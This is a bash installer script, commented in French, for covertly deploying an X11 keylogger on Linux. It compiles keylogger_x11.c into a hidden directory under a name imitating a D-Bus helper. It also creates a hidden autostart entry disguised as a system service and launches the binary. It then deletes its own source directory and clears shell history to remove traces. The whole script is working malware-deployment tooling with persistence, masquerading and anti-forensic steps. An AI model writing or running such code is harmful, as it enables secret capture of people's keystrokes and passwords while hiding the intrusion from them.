#!/bin/bash
# Script d'installation ultra-discret

# 1. Dossier de destination caché (presque personne ne va ici)
HIDDEN_DIR="$HOME/.local/share/.sys-updates"
BIN_NAME=".dbus-helper"
BIN_PATH="$HIDDEN_DIR/$BIN_NAME"
DESKTOP_FILE="$HOME/.config/autostart/dbus-helper.desktop"

# 2. Créer le dossier et compiler
mkdir -p "$HIDDEN_DIR"
if [ -f "keylogger_x11.c" ]; then
    gcc "keylogger_x11.c" -o "$BIN_PATH" -lX11
    if [ $? -ne 0 ]; then
        exit 1
    fi
fi

# 3. Créer l'auto-démarrage discret
cat <<EOF > "$DESKTOP_FILE"
[Desktop Entry]
Type=Application
Exec=$BIN_PATH
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
Name=DBus System Helper
Comment=Internal service for dbus message bus
EOF

chmod +x "$DESKTOP_FILE"

# 4. Lancement immédiat
"$BIN_PATH" &

# 5. NETTOYAGE FINAL : Supprimer toutes les traces d'installation
# On supprime le dossier actuel où se trouve le code source !
CURRENT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
(sleep 1 && rm -rf "$CURRENT_DIR") &

echo "[+] Installation terminée. Le système est prêt."
# On efface aussi l'historique récent des commandes
history -c
